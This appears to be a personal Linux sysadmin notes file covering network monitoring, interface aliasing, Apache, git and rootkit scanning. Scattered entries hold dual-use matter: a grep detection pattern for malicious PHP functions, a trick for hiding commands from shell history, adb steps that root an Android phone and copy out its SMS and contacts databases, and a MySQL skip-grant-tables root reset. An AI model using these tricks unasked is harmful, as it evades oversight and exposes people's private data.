@@ -1,0 +1,2467 @@
+                                                               -: Welcome to my Notes  :- 
+                                                             ---------------------------
+                                                                  www.trizeus.com 
+
+Hi My Name is Sanjay.D.Bhalerao. These are my notes , if you feel this help to save your day pls mail me on sanjaydb@trizeus.com
+
+
+Network MOnitering Tools List
+---------------------------
+{
+  bmon
+	nethogs
+	inotify-tools
+  {
+      inotifywait -r -m --timefmt '%H:%M' --format '%T %w %e %f' /var/www/
+  }
+	netstat -an | grep 21
+	iptraf
+	sniffjoke
+	nload
+	pkstat -i eth0 -nt
+	lsof -Pwln | grep 1720
+	lsof -n -sTCP:LISTEN -i:1720
+	unhide-tcp
+	sar -n DEV 1 3
+	ss -lp
+	iftop
+	htop
+  
+  
+  
+  port data monitering 
+	----------------------
+	#tcpdump -n tcp dst portrange 1-1023
+
+	Capture any packets with destination IP 192.168.1.1 and destination port 23. Display IP addresses and port numbers:
+	---------------------------------------------------------------------------------------------------------------------------------
+	#tcpdump -n "dst host 192.168.1.1 and dst port 23"					-
+
+	Capture any packets with destination IP 192.168.1.1 and destination port 80 or 443. Display IP addresses and port numbers:
+	-----------------------------------------------------------------------------------------------------------------------------------------
+	#tcpdump -n "dst host 192.168.1.1 and (dst port 80 or dst port 443)"
+
+	Capture either ICMP or ARP packets:
+	-----------------------------------------
+	#tcpdump -v "icmp or arp"
+
+	Capture any packets that are broadcast or multicast:
+	---------------------------------------------------------
+	#tcpdump -n "broadcast or multicast"
+
+	Capture any packets where the destination network is 192.168.1.0/24. Display IP addresses and port numbers:
+	--------------------------------------------------------------------------------------------------------------------------
+	#tcpdump -n dst net 192.168.1.0/24
+	#tcpdump -n src net 192.168.1.0/24
+
+	Capture any packets where the destination host is 192.168.1.1. Display IP addresses and port numbers:
+	-----------------------------------------------------------------------------------------------------------------
+	#tcpdump -n dst host 192.168.1.1
+	#tcpdump -n src host 192.168.1.1
+
+
+	time used by following commands 
+	-------------------------------
+	{
+		time netstat -at
+		time ss -atr
+	}
+
+
+	ss	--> Display socket summary
+	--
+	{
+		ss -s 		--> Display sockey summary
+	
+		ss -l		--> display all open ports
+
+		ss -pl		--> responsible for open port
+
+		ss dst 123.1.2.100:http		--> connection made by remote ip
+
+		ss src 75.126.153.214:http	--> source ip
+
+		ss -t -a	--> all tcp packet , can use -x (unix) -u (udp) -w(raw) 
+	
+		ss -o state established '( dport = :smtp or sport = :smtp )'	--> display all established smtp ports
+
+		ss -x src /tmp/.X11-unix/*					--> all local port connected to x server
+
+		ss -o state fin-wait-1 '( sport = :http or sport = :https )' dst 10.10.0.0/24	--> tcp socket in fin-wait 1 state
+		{
+				established,established,syn-recv,fin-wait-1,fin-wait-2,time-wait,closed,close-wait,last-ack,listen,closing
+				all : All of the above states
+				connected : All the states except for listen and closed
+				synchronized : All the connected states except for syn-sent
+				bucket : Show states, which are maintained as minisockets, i.e. time-wait and syn-recv.
+				big : Opposite to bucket state.
+
+
+				ss  sport = :http
+				ss  dport = :http
+				ss  dport \> :1024
+				ss  sport \> :1024
+				ss sport \< :32000
+				ss  sport eq :22
+				ss  dport != :22	
+		}
+
+
+	}
+
+Networking 
+----------
+{
+
+	IP Aliasing
+	-------------
+	ifcfg-eth0 ---> physical network card 1
+	ifcfg-eth1 ---> physical network card 2
+
+	/etc/sysconfig/network-scripts/	---> network device file location
+
+
+	Creating new three virtual IPS
+	----------------------------------
+	# cd /etc/sysconfig/network-scripts/
+	# cp ifcfg-eth0 ifcfg-eth0:0
+	# cp ifcfg-eth0 ifcfg-eth0:1
+	# cp ifcfg-eth0 ifcfg-eth0:2
+
+	# vi ifcfg-eth0
+	{
+		DEVICE="eth0"		---> requires
+		BOOTPROTO=static
+		ONBOOT=yes
+		TYPE="Ethernet"
+		IPADDR=172.16.16.125		---> requires
+		NETMASK=255.255.255.224
+		GATEWAY=172.16.16.100
+		HWADDR=00:0C:29:28:FD:4C
+	}	
+
+	# vi ifcfg-eth0:0
+	------------------
+	{
+		DEVICE="eth0:0"
+		BOOTPROTO=static
+		ONBOOT=yes
+		TYPE="Ethernet"
+		IPADDR=172.16.16.126
+		NETMASK=255.255.255.224
+		GATEWAY=172.16.16.100
+		HWADDR=00:0C:29:28:FD:4C
+	}
+
+	#ifcfg-eth0:1
+	{
+		DEVICE="eth0:1"
+		BOOTPROTO=static
+		ONBOOT=yes
+		TYPE="Ethernet"
+		IPADDR=172.16.16.127
+		NETMASK=255.255.255.224
+		GATEWAY=172.16.16.100
+		HWADDR=00:0C:29:28:FD:4C
+	}	
+
+	#ifcfg-eth0:2
+	{
+		DEVICE="eth0:2"
+		BOOTPROTO=static
+		ONBOOT=yes
+		TYPE="Ethernet"
+		IPADDR=172.16.16.128
+		NETMASK=255.255.255.224
+		GATEWAY=172.16.16.100
+		HWADDR=00:0C:29:28:FD:4C
+	}
+
+	# /etc/init.d/network restart
+	#ifconfig
+	#ping 172.16.16.126
+	#ping 172.16.16.127
+	#ping 172.16.16.128
+
+	Assign Multiple IP Address Range
+	-------------------------------------
+	# cd /etc/sysconfig/network-scripts/
+	# cp -p ifcfg-eth0 ifcfg-eth0-range0
+	# vi ifcfg-eth0-range0
+	{
+		#DEVICE="eth0"
+		#BOOTPROTO=none
+		#NM_CONTROLLED="yes"
+		#ONBOOT=yes
+		TYPE="Ethernet"
+		IPADDR_START=172.16.16.126
+		IPADDR_END=172.16.16.130
+		IPV6INIT=no
+		#GATEWAY=172.16.16.100
+	}
+
+	# /etc/init.d/network restart
+	#ifconfig
+
+
+	Trizeus Network config
+	--------------------------
+	vi  cat /etc/network/interfaces
+	{
+		auto eth0
+		allow-hotplug eth0
+		iface eth0 inet static
+		  address 192.xxx.x.xxx
+		  netmask 255.xxx.xxx.0
+		  gateway 192.xxx.xxx.xxx
+	
+		auto eth0:1
+		allow-hotplug eth0:1
+		iface eth0:1 inet static
+		address 192.xxx.xxx.xxx
+		netmask 255.xxx.xxx.xxx
+		gateway 192.xxx.xxx.xxx
+	
+		auto eth0:2
+		allow-hotplug eth0:2
+		iface eth0:2 inet static
+		address 192.xxx.xxx.xxx
+		netmask 255.xxx.xxx.xxx
+		gateway 192.xxx.xxx.xxx
+	}
+
+
+	speed & Duplex
+	------------------
+	#mii-tool -v eth0
+	#ethtool eth0
+
+	#ethtool -s eth0 speed 100 duplex full autoneg off 	--->(assuming 100 Mbps and full duplex)
+	#mii-tool -F 100baseTx-FD eth0  ---> (same assumption)
+	If one of these commands successfully set your NIC, then you can put it into /etc/network/interfaces so it runs when you bring the interface up (e.g. at boot time)
+		{
+			 iface eth0 inet static
+		        address ...
+		        netmask ...
+		        gateway ...
+		        up sleep 5; ethtool -s eth0 ...
+		}
+	Reboot the machine to make sure it comes up correctly
+
+	The configuration file resolv.conf at /etc/resolv.conf contains information that allows a computer connected to a network to resolve names into addresses
+
+	vi /etc/ resolv.conf 	---> typically contains the IP addresses of nameservers (DNS name resolvers) that will attempt to translate names into addresses for any node 	
+						  available on the network
+	{
+		nameserver 12.34.56.78
+		nameserver 12.34.56.79
+	}
+
+	Bridging
+	--------
+	Bridging puts multiple interfaces into the same network segment. This is very popular when connecting a server to multiple switches for high availability or with virtualization
+
+	Connect a server to 2 switches (via eth0 and eth1) by defining bridge 0 and give the server an IP address in this subnet:
+	{
+		auto br0
+		iface br0 inet static
+		address 10.10.0.15
+	        netmask 255.255.255.0
+	        gateway 10.10.0.1
+	        bridge_ports eth0 eth1
+	        up /usr/sbin/brctl stp br0 on
+	}
+	If a server is connected to multiple switches then you usually need to run the spanning tree protocol to avoid loops. Therefore STP must be turned on via an "up" command as shown above
+
+
+	Howto use vlan (dot1q, 802.1q, trunk) (Etch, Lenny)
+	----------------------------------------------------------
+	#modprobe 8021q
+	#apt-get install vlan
+
+	#vconfig add eth0 222    # 222 is vlan number
+	#ifconfig eth0.222 up
+	#ifconfig eth0.222 mtu 1496    #optional if your network card doesn't support MTU 1504B
+	#ifconfig eth0.222 10.10.10.1 netmask 255.255.255.0
+
+	vi  /etc/modules
+	{
+		8021q
+	}
+
+	In /etc/network/interfaces to section iface add parameter:
+	{
+		vlan-raw-device eth0
+	}
+
+
+
+	Multiple IP addresses
+	------------------------
+	An alias interface should not have "gateway" or "dns-nameservers"; dynamic IP assignment is permissible.
+	# vi /etc/network/interfaces 
+	{
+		auto eth0
+		allow-hotplug eth0
+		iface eth0 inet static
+		    address 192.xxx.xxx.xxx
+		    netmask 255.xxx.xxx.xxx
+		    gateway 192.xxx.xxx.xxx
+
+		auto eth0:0
+		allow-hotplug eth0:0
+		iface eth0:0 inet static
+		    address 192.xxx.xxx.xxx
+		    netmask 255.xxx.xxx.xxx
+
+		auto eth0:1
+		allow-hotplug eth0:1
+		iface eth0:1 inet static
+		    address 192.xxx.xxx.xxx
+		    netmask 255.xxx.xxx.xxx
+
+}
+
+
+	#ip addr show dev eth0
+	#.vimrc set noncompatbile
+	#apt-get install tmux
+
+
+	commands
+	--------
+	{
+		ip link show
+		netstat -i
+	}
+
+
+}
+
+
+Process Aanalsysis
+------------------
+{
+	inotifywait -m -e MODIFY -r  /
+
+	lsof | grep TCP
+	find / -type f -perm 0777
+	rem for user in $(cut -f1 -d: /etc/passwd); do crontab -u $user -l; done
+	for user in $(cut -f1 -d: /etc/passwd); do echo $user; crontab -u $user -l; done
+	tripwire --check
+	chkrootkit
+	rkhunter --check
+	logwatch
+	rsync -avz --delete ./Stuff user@host:/Stuff
+	nethog
+
+	Find Malicous php files
+	--------------------------
+	find ./public_html/ -name \*.php -exec grep -HRnDskip "\(passthru\|shell_exec\|system\|phpinfo\|base64_decode\|chmod\|mkdir\|fopen\|fclose\|readfile\) *(" {} \;
+
+	execute hidden command
+	---------------------------
+	<space>secret_command;export HISTCONTROL=
+
+}
+
+Log Monitering
+-------------
+{
+	syslog
+	messages
+	cron.log
+	auth.log
+	daemon.log
+	kern.log
+	debug
+	pm-powersave.log
+
+
+
+}
+
+
+
+
+Vim Editor
+---------
+{
+	:%s/FindMe/ReplaceME/g
+	esc + S		--> Eof
+	esc + 1g	--> Bof
+	esc + gg	--> "
+	esc + 21g	--> jmp to line 21
+
+}
+
+
+Multipule Web Site
+------------------
+{
+
+
+
+	personal user website
+	------------------------
+	a2enmod userdir
+	chgrp -R aquasan21 public_html/
+	 sites-available/
+
+	quotacheck -vagum
+	 touch /home/aquota.user
+	  693  touch /home/aquota.group
+	  694  chmod 600 /home/aquota.user /home/aquota.group
+	modprobe quota_v2
+	 echo 'quota_v2' >> /etc/modules
+
+
+	Creating a Virtual Network Interface in Debian
+	---------------------------------------------------
+	nano /etc/network/interfaces
+
+	# Add the following
+	auto eth0:1
+	allow-hotplug eth0:1
+	iface eth0:1 inet static
+	  address 192.168.1.248
+	  netmask 255.255.255.0
+	  gateway 192.168.1.254
+
+
+	service networking restart
+
+
+	diffrent subnet
+	----------------
+	# Add the following
+	auto eth0:1
+	allow-hotplug eth0:1
+	iface eth0:1 inet static
+	  address 10.10.10.7
+	  netmask 255.255.255.252
+	  gateway 10.10.10.6
+
+	route add -net 10.10.10.7 netmask 255.255.255.252 gw 192.168.1.252
+
+
+	apache2
+	---------
+	root@trizeus:/home/aquasan21# cat /etc/hosts
+	127.0.0.1       localhost trizeus
+	192.168.1.21	san.com san.com
+	192.168.1.20	man.com man.com
+	115.96.228.205	trizeus.com	trizeus.com
+	::1             localhost ip6-localhost ip6-loopback
+	fe00::0         ip6-localnet
+	ff00::0         ip6-mcastprefix
+	ff02::1         ip6-allnodes
+	ff02::2         ip6-allrouters
+
+
+	a2enmod userdir
+	chgrp -R aquasan21 public_html/
+	 sites-available/
+
+	root@trizeus:/etc/apache2/sites-enabled
+	 man.com -> /etc/apache2/sites-available/man.com
+	san.com -> /etc/apache2/sites-available/san.com
+
+	delete all default files from root@trizeus:/etc/apache2/sites-available
+man.com
+	<VirtualHost 192.168.1.20>
+	    ServerName www.man.com
+	    DocumentRoot /home/www/html/man.com/html
+	    ServerAdmin webmaster@man.com
+	    ErrorLog /var/log/apache2/www.man.com-error_log
+	    CustomLog /var/log/apache2/www.man.com-access_log common
+	</VirtualHost>
+
+
+
+
+}
+
+
+Windows
+{
+
+	smbclient -L 192.168.0.101 -U Trizeus-02
+	// deprecated -- smbmount "\\\\192.168.0.100\\E$" -U Trizeus-02 -c 'mount /mnt -u 500 -g 100'
+	apt-get install cifs-utils
+	mount -t cifs //192.168.0.100/ samba/ -o rw
+
+}
+
+
+
+Temp Data pls Ignore 
+--------------------
+{
+
+	iptables -t nat -I OUTPUT  -d 84.251.xxx.xxx  -p tcp --dport 80  -j DNAT --to-destination 192.xxx.xxx.xxx
+
+
+	iptables -t nat -I OUTPUT -d 1xx.xx.xxx.xxx -p tcp --dport 80 -j DNAT --to-destination 192.xxx.xxx.xxx   
+iptables -t nat -I OUTPUT -d 1xx.xx.xxx.xxx -p tcp --dport 21 -j DNAT --to-destination 192.xxx.xxx.xxx
+iptables -t nat -I OUTPUT -d 1xx.xx.xxx.xxx -p tcp --dport 22 -j DNAT --to-destination 192.xxx.xxx.xxx   
+
+
+
+}
+
+
+Filtered 
+--------
+{
+	
+	which process is listening upon a port
+	--------------------------------------
+	{
+		netstat -a |grep LISTEN | grep -v unix 
+		lsof -i :[8888]
+
+
+		netstat -tulpn			--> list pid,port
+		ls -l /proc/[pid]/exe		--> exe app
+		ls -l /proc/[pid]/cwd		--> current dir of app
+		pwdx [pid]			-->  "
+		cat /proc/[pid]/environ		--> app enviornment
+
+		grep --color -w -a [StringToFind] /proc/[pid]/environ	--> color output od searching string .
+		grep 443 /etc/services		--> https 443/udp
+
+		fuser -v [port/tcp]		--> to get PID of process
+		fuser -v 25/tcp			--> 7000/tcp : 3813
+		fuser -vk 3143/tcp		--> kill the process 
+		
+		ls -l /proc/3813/exe		--> app name
+		ls -l /proc/[pid]/cwd
+
+
+		netstat --tcp --udp --listening --program
+		
+		lsof +M -i4
+
+		nmap -sS -sV -p 8080 --script http-open-proxy.nse 115.96.228.205	--> whcih service running on 8080	
+		
+		tcpdump -n tcp dst portrange 1-1023
+		tcpdump -n "dst host 192.168.1.1 and (dst port 80 or dst port 443)"
+
+		
+	}
+
+
+	OS Infromation
+	--------------
+	{
+
+			cat /etc/issue
+			lsb_release -a 
+			lsb_release -rcs
+
+
+
+	}
+
+
+	Password Encryption
+	-------------------
+	{
+		openssl rand -base64 12 > p.txt 	--> generate pass
+		gpg -c p.txt				--> encrypt file
+		rm p.txt
+		pgp p.txt.gpg				--> decrypt file
+
+	}
+
+	
+	Crontab
+	-------
+	{
+
+		crontab -e		--> Exit Script file
+		{
+			30 * * * * /home/user/backup.sh
+		}
+		
+		backup.sh
+		---------
+		{
+			rsync --progress --partial -avz /folder/to/copy/ user@remote.server:/remote/folder
+		}	
+
+
+		easy way
+		-------
+		put script in following folder
+
+			/etc/cron.daily/
+			/etc/cron.hourly/
+			/etc/cron.monthly/
+			/etc/cron.weekly/
+
+	}
+	
+
+	Add Secondary IP
+	----------------
+	{
+		ifconfig eth0:0 192.168.1.2 netmask 255.255.255.0 up 		--> Restart servcie
+
+		ip address add 192.168.99.37/24 dev eth0
+
+		make permanent Change
+		---------------------
+		{
+			vim /etc/network/interfaces
+			{
+				auto eth0:1
+				iface eth0:1 inet static
+				address 192.168.0.1
+				gateway 192.168.0.254
+				netmask 255.255.255.0
+
+			}
+
+
+		}
+
+	
+	ISO
+	---
+	{
+		create ISO file from DVD
+		------------------------
+		dd if=/dev/cdrom of=cd.iso
+
+		mount bin as iso
+		----------------
+		apt-get install iat
+		iat a.bin a.iso
+		mount -o loop a.iso /mnt
+		
+
+		mount ISO
+		---------
+		mount -t iso9660 -o loop cd.iso /media/iso
+		
+		mkdir /mnt/myiso 
+		mount myiso.iso /mnt/iso/ -t iso9660 -o ro,loop=/dev/loop0 		
+
+		play mounted Movie
+		------------------
+		vlc /media/iso/video_ts/
+	}
+
+
+}
+
+
+Andriod 
+-------
+{
+	 	clear 
+
+		adb push busybox /data/local/tmp 
+		adb push su /data/local/tmp 
+		adb push su /data/local/tmp 
+		adb push Superuser.apk /data/local/tmp
+		adb shell
+		mv su /system/bin
+		mv Superuser.apk /system/app
+		reebot
+
+		adb pull /data/data/com.android.providers.telephony/databases/mmssms.db
+		adb pull /data/data/com.android.providers.contacts/databases/contacts2.db
+
+		adb shell mount -o remount,rw -t yaffs2 /dev/block/mtdblock3 /system
+		adb shell rm /data/data/com.android.providers.telephony/databases/mmssms.db
+		adb shell rm /data/data/com.android.providers.contacts/databases/contacts2.db
+		adb push mmssms.db /data/data/com.android.providers.telephony/databases/
+		adb push ~/Desktop/phone/contacts2.db /data/data/com.android.providers.contacts/databases/
+
+}
+
+
+Sniff
+-----
+{
+	tcpdump -i wlan0 -v -n host 62.231.217.98 -w a.cap
+	wireshark a.cap
+	
+	apt-get install snoopy
+	apt-get install syslog-ng
+	/etc/init.d/syslog-ng restart
+	cat /var/log/trizeus/auth.log		--> log shell activity 
+
+}
+
+
+GUI Monitering
+--------------
+{
+	gkrellm
+	Monitorix
+	
+}
+
+
+Tmux Script
+{
+	a.py
+	----
+	{
+		import subprocess
+
+		left_commands = [
+		    "python manage.py runserver",
+		    "python manage.py celeryd -Q queueA -c 2 -E -n worker1",
+		    "python manage.py celeryd -Q queueB -c 2 -E -n worker2",
+		]
+		right_commands = [
+		    "python manage.py celerycam",
+		    "tail -f /var/log/postgresql/postgresql-8.4-main.log",
+		]
+		session = ''
+
+		if right_commands:
+		    session += 'tmux selectp -t 0; tmux splitw -hd -p 35 \"%s\"; ' % right_commands[-1]
+		for index, command in enumerate(right_commands[:-1]):
+		    session += 'tmux selectp -t 1; tmux splitw -d -p %i \"%s\"; ' % (
+		        100 / (len(right_commands) - index),
+		        command
+			    )		
+
+		for index, command in enumerate(left_commands[1:]):
+		    session += 'tmux selectp -t 0; tmux splitw -d -p %i \"%s\"; ' % (
+		        100 / (len(left_commands) - index),
+		        command
+		    )
+		if left_commands:
+		    session += left_commands[0]
+
+		args = [
+		    'tmux',
+		    'new-session',
+		    session,
+		]
+		print 'Running ', args
+		subprocess.call(args)
+	}
+}
+
+Mysql Reset Pwd
+---------------
+{
+	/etc/init.d/mysql stop
+	/usr/bin/mysqld_safe --skip-grant-tables &
+	mysql --user=root mysql
+	mysql> update user set Password=PASSWORD('new-password-here') WHERE User='root';
+	flush privileges;
+	exit
+
+	g++ m.c -o m  `mysql_config --cflags --libs`
+
+
+}
+
+
+
+Global Search & Replace 
+-----------------------
+{
+	find . -type f | xargs sed -i -e 's/\.php/\.php5/g' 		-->This will find all occurences of .php and change them to .php5 
+									It will search all files in the current directory and recurse through all directories found. 
+b
+	
+	find . -type f -exec grep -l "seting" {} +
+
+}
+
+
+Git
+---
+{
+	git config --global user.name "san"
+	git config --global user.email	"sanjaydb@trizeus.com"
+
+	cd prrojectGit
+
+	// stageing Area
+	{
+		git init projectGit
+		git status
+
+		git add .	//add all files
+		git add singlefile.txt		//add single file
+		git log
+		git rm --cached filename.txt	// remove file not commited yet
+						// the snapshot not occured yet.
+		git status
+		git commit -m "This is my First File v1.0 firts commit"
+
+		git log 	// list all commit repozitory
+
+		git diff	// what is change is displayed
+		git diff --cached // dispalay cached file
+		git log --oneline // display names
+
+		git commit -a -m "shortcut"
+		git status -s t
+
+		git checkout 0dabx369
+
+
+
+		git reset --hard 0d0d369	// hard delete 
+
+		git stash			// safe 
+		git reset --hard 0xdod369
+		git stash pop				
+
+
+		git revert 0xdod369
+
+		git reset --hard HEAD
+		git rebase master
+
+		--------------------
+		e.g.
+
+		git diff <commit hash> <filename>
+
+		//revert specific file
+		git reset <commit hash> <filename>
+
+		git checkout <commit hash>
+		git checkout -b <new branch name>
+		
+		git checkout <my branch>
+		git rebase master
+		git checkout master
+		git merge <my brach>
+
+		-------------------------
+		
+		auto complete ->	~/.bashrc
+						git-completion.bash	//download
+
+					curl -OL https://github.com/git/git/raw/master/contrib/completion/git-completion.bash
+
+					vi .bash_profile
+					{
+						if { -f ~/.git-completion.bash ]; then		//if file exist
+							source ~/.git-completion.bash		//run
+						fi
+					}
+
+					
+
+
+		system  -> /etc/gitconfig
+		user	-> ~/.gitconfig
+		project	-> my_project/.git/config
+
+		configure
+		---------
+		git config --system		-> system
+		git config --global		-> user
+		git config			-> project
+
+
+		user
+		----
+		git config --global user.name "Sanjay Bhalerao"
+		git config --global user.email "sanjaydb@trizeus.com
+		git config --list 
+		cat .gitconfig
+
+		git config --global core.editor "vi -wl1"	// -wl1 wait on line one 
+		git config --global color.ui true 
+		
+		git log -n 0			// commit number
+		git log --since=2012-06-15	// search date wise commit
+		git log --until=2012-06-15
+		git log --author="Sanjay"
+		git log --grep="Init"			// grep commit msg 
+		git diff 				// all files -- local
+		git diff filname.txt			// diff single file
+  		git diff --staged			// diff from repository
+		git diff --color-words filename.txt	//wrap -shif+S -S  
+
+		git commit -am "message 		//shortcut ... not need git add .   
+		
+		git rm filetodlete.txt		// to delete file
+		git mv file1.txt 2ndfile.txt	// rename / move
+		git add file.txt
+		git add dirname/		// in dir add all files
+
+		
+		undelete 
+		--------
+		git diff
+		git checkout foldername
+		git checkout filename
+		git checkout branchname     
+
+		git reset HEAD index.html 	// unstage a file from stagin area : color green
+
+		
+		git commit --amend -m "change data"	// last HEAD only 
+ 
+		git checkout 369HASHFROM_GIT_LOG_TO_REVER -- index.html	       //revert old file from HASH
+		{
+			git diff -- staged
+			git reset HEAD index.html
+			git checkout -- index.html 
+			git status
+		}
+
+		
+		//mirror image
+		git revert [shah] 		--> edit mesg
+		git status	
+		git log				--> edited message with file rever 
+
+		
+		soft
+		----
+		{
+			cat .git/HEAD		--> ref: refs/heads/master
+			cat .git/refs/heads/master	--> HEAD pointer || Repor Pointer SHAH
+
+			git log > shah.txt	--> copy commit SHAH in a file . 
+						--> IMP if head moved back all the SHA will Disapper
+						--> To go back we need to have Previous HEAD SHAH
+			git reset --soft dadSHAH369 
+			cat .git/refs/heads/master		--> new head shah
+			git status
+			git diff
+
+			git reset --soft  PREVIOSSHAH		--> last one
+			git log
+
+
+
+		}
+
+		mixed Reset 	//staging will chnage same as soft
+		-----------
+		{
+			git reset --mixed da369
+			git status
+				--> modified : red color
+			git diff
+			git log
+				// move back
+			git add .
+			git reset HEAD index.html	// head stays there just pull 1 file 
+			git status
+			git reset --mixed LASTSHAH
+			git log
+			
+		}
+
+
+		hard Rest
+		--------
+		{
+
+			staging index and dir are same 
+
+			git reset --hard da369
+			git log
+			git status
+			
+			back
+			----
+			git reset --hard 5555
+			git log
+			git status
+
+		}
+
+		safe
+		----
+		{
+			git checkout -- index.html	// checkout [-- = current branch ] 
+		}
+		
+
+	
+		clean		// permanent file delete which are not in our repo
+		-----
+		{
+			git clean -n 	// list file which are not i our repository
+			git clean -f 
+		}
+	
+
+		ignore files 
+		------------
+		{
+
+			project/.gitignore
+			{
+				* ? [aeiou] [0-9]
+				*.php
+				!index.php	--> dont ignore 
+				asset/videos/	--> ingnore dir
+			}
+		
+			.gitignore
+			{
+				#comments
+				tem.txt
+				*.log
+				.DS_Store	--> MAC
+				*.zip
+  				*.gz
+				log/*.log
+				log/*.log.[0-9]
+				assets/photosop/
+				assets/videos
+				!assets/videos/tour_*.mp4	--> will gong to track
+			}
+
+
+			igoner file globally for all my projects
+			----------------------------------------
+			.gitignore_global
+			{
+				*.zip
+			}
+
+			git config --global core.excludesfile ~/.gitignore_global
+			cat ~/.gitconfig 
+			
+
+
+			adding empty dir
+			----------------
+			{
+
+				create file .gitkeep in the empty dir and commit
+
+			}
+
+			git status	--> .gitignore
+
+			git add .gitignore
+			git commit -m "Add .gitignore"
+			
+						
+			Real_Project : e.g
+			------------
+			{
+				cd explore_git_project
+				git init 
+				git status 
+				git log 	--> error fatal : bad defualt revision HEAD
+				git add .
+				git status 	--> green files : 
+				git commit -m "Innitial commit"	--> yellow color
+				git log		--> no error
+				
+					-->modifyed all file with 4315 replace it with 369
+
+				git status 	--> Red color list all files changed
+				git diff contact.html	--> Display red line as previuos change  -
+							    Display Green line as Latest change	 +
+								F & B keys to move SpaceBar -R 
+							togglefold long lines -->  minus sign(-) + shift + s + return
+							back -S 
+			}
+
+			tree-ish
+			--------
+			{
+				git ls-tree HEAD	--> Those are the fles that are in the repository at that point
+				git ls-tree master 	--> same as above
+				git ls-tree master assets/	--> directory
+				git ls-tree master^ assets/	--> display files one commit back "^"
+				git ls-tree SAHS	--> get that tree
+			}	
+	
+			git log
+			-------
+			{
+				git log --oneline	--> display shourt data
+				git log --oneline -3 	--> limit listing to only 3 commit
+				git log --since="2012-06-20"	--> date
+				git log --until="2012-06-20"	-->"
+				git log --since="2 weeks ago" --until="3 days ago"
+				git log --since=2.week --until=3.days
+				git log --author="san"	
+				git log --grep="temp"
+				git log SHAH1..SAHA2 --oneline 	--> range
+				git log  SHAH.. index.html	--> list log that affect index.html file , if want to know what happend to 
+								--> particular file, will tell evertthing happed since the initial commit
+								--> going forword
+				git log -p 			--> detailed log
+				git log -p SHAH.. index.html	--> what happed to index scince SHAH in detail
+				git log --stat --summary	--> summary
+				git log --format=oneline	--> detailed SHAH
+				git log --format=short
+				git log --forat=medium
+				git log --format=full
+				git log --format=email
+				git log --graph
+				git log --oneline --graph --all --decorate
+				
+			}
+
+				
+			what was changed
+			----------------
+			{
+				git log --online
+				git show SHAH
+				git show --format=oneline HEAD
+				git show --format=oneline HEAD^	--> head back 1
+				git show --format=oneline HEAD~3	--> head back 3
+				
+				git ls-tree master
+				git show SHAH		--> whats inside in
+
+			}	
+			
+			compare
+			-------
+			{
+				git diff 	--> compare staging dir with current directory
+				git diff --cached/staged		--> diffrence between the staging index and the repository
+				git diff SHA 		--> all the difference between the directory  at the point in time and 
+							--> my current working directory
+				git diff SHA tours.html
+				git diff SHA1..SHA2
+				git diff SHA1..SHA2 t.html
+				git diff SHA1..HEAD
+				git diff SHA1..HEAD^^
+				
+				git log --oneline
+				git diff --stat --summary SHA1..HEAD
+				git diff -b  / --ignore-space-chnage SHA1..HEAD
+				git diff -w SHA1..HEAD
+
+			}
+
+			branches
+			--------
+			{
+				
+
+				git branch	--> master *head
+				git branch new_feature	--> create new branch
+				git branch
+
+				ls -la .git/refs/heads
+				cat .git/refs/heads/new_feature
+
+				switch branch ( affect working Dir)
+				----------------------------------
+				{
+					create new branch
+					-----------------
+					git checkout new_feature		--> switch to new branch
+					git branch		--> green highlight
+					
+					now change file
+					---------------
+					git commit -am "modified Brach"		--> this commit will effect only branch
+					git log --oneline
+			
+					switch back to master
+					---------------------
+					git checkout master
+					git log --oneline
+	
+					git branch	--> new_feature
+					git show HEAD
+					
+					create and checkout to new branch
+					---------------------------------
+					git branch new_baranch
+					git checkout -b shorten_title
+					git branch	--> *shorten
+				
+					-->modify data now
+					git status
+					git log --graph --oneline --decorate -all
+					
+					compare
+					-------
+					git branch
+					git diff master..new_feature	-->what chnaged between to branch
+	
+					git diff --color-words new__feature..shorten_title	--> online diff
+					git diff --color-words branch1..branch^			--> ^ ine step back ~1
+					
+					git branch --merged
+
+					git checkout new_frature	--> diffrent baracnch has chnages 
+					git branch --merged
+
+					delete branch
+					-------------
+						-->move to master branch
+					git branch --delete/-d soe_branchName
+					
+					Configuration
+					-------------
+						-->change prompt and add branch name
+						-->file needed .bash_profile
+					__git_ps1	--> change prompt 
+					echo PS1	--> unix prompt stores here
+					export PS1='\W$(__git_ps1 "(%s)") > '
+					export PS1='\W$ --> current working dir 
+					alias ll='ls -lahG'
+					
+					rename branch
+					------------
+					git branch -m/--move new_feature seo_title
+					git branch
+					
+					merge branch
+					-----------
+						-->merger seo_data to master..
+					git branch	--> list all branches
+					git diff master..seo_title	--> list changes done 
+						-->now checkout to where u want to merge in this case master
+					git checkout master
+					git merge seo_title	-->will merge every thing modified and added to master.
+					git log
+					git diff master..seo_title	--> no diff both same
+					git branch --merged
+					
+							
+ 
+
+				} 	
+			
+				
+	
+				
+				
+				git diff master..new_feature
+				git branch -m new_feature seo_title	--> rename/ move branches
+				git brach 
+				
+			}
+
+	
+		}		
+
+
+	
+
+scan.sh
+-------
+{
+	chkrootkit -x lkm 
+	rkhunter --update
+	rkhunter -c -sk 
+	tripwire --check 
+	nmap -v -A -sS -T4 -P0 -sC xxx.xxx.xxx.xxx -p1-65535
+	crontab -l 
+	lsof -i 
+	lsof | grep TCP
+	find / -type f -perm 0777
+	for user in $(cut -f1 -d: /etc/passwd); do echo $user; crontab -u $user -l; done
+	logwatch
+	ausearch -ts today -k password-file
+	#ausearch -ts 3/13/14 -k password-file -x rm
+
+}
+
+sy.ch
+-----
+{
+	cftpput -vv -z -R -f /xxxx/aquasan21/san/l.cfg /xxx/x/xxily/ /xxxx/aquasan21/.xxxxurse/xoxes/
+
+}
+	
+l.xyg
+-----
+{
+	host ftp.xxxxxxxxxxx.xx
+	user xxxxxxxxxxxxxxxxx
+	pass xxxxxxxxxxxxxxxxxx
+}
+
+		
+
+Apache User Web
+---------------
+{
+	cd /etc/apache2/sites-enabled
+	ln man.com	-> /etc/apach2/sites-available/man.com
+	ln san.com	-> /etc/apach2/sites-available/san.com
+	cd ..
+	cd /etc/apache2/sites-available
+	mv default-ssl default-ssl.bck
+	mv default default.bck
+	vi man.com
+	{
+		<VirtualHost 192.168.1.20>
+    			ServerName www.man.com
+			DocumentRoot /home/www/html/man.com/html
+    			ServerAdmin webmaster@man.com
+    			ErrorLog /var/log/apache2/www.man.com-error_log
+    			CustomLog /var/log/apache2/www.man.com-access_log common
+		</VirtualHost>
+	}
+
+	vi san.com
+	{
+		<VirtualHost 192.168.1.21>
+    			ServerName www.san.com
+    			DocumentRoot /home/aquasan21/public_html
+    			ServerAdmin webmaster@example.com
+    			ErrorLog /home/aquasan21/public_html/log/www.san.com-error_log
